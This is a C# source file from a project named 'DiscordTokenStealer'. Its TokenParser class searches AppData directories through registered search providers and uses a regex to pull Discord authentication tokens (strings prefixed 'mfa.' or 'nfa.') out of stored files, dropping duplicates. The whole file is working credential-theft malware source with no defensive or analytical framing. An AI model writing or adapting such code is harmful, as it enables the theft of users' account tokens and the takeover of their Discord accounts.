using System.Collections.Concurrent;
using System.Reflection;
using System.Text.RegularExpressions;
using DiscordTokenStealer.DirectorySearchProviders;

namespace DiscordTokenStealer;

public static class TokenParser
{
    private static readonly Regex TokenRegex = new("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);

    public static async IAsyncEnumerable<string> ParseAsync()
    {
        foreach (var field in typeof(AppDataSearchProvider).GetFields(BindingFlags.Static | BindingFlags.Public)
                     .Where(f => f.DeclaringType!.IsAssignableTo(typeof(IDirectorySearchProvider))))
        {
            if ((IDirectorySearchProvider?) field.GetValue(null) is not {Exists: true} searchProvider)
                continue;

            var consumedTokens = new ConcurrentBag<string>();

            await foreach (var contents in searchProvider.EnumerateContentsAsync())
            foreach (var token in ParseTokensFromString(contents))
            {
                if (consumedTokens.Contains(token)) continue;
                yield return token;
                consumedTokens.Add(token);
            }
        }
    }


    private static IEnumerable<string> ParseTokensFromString(string str)
    {
        return from match in TokenRegex.Matches(str)
            where match.Success && match.Groups.Count >= 1
            select match.Groups[1].Value;
    }
}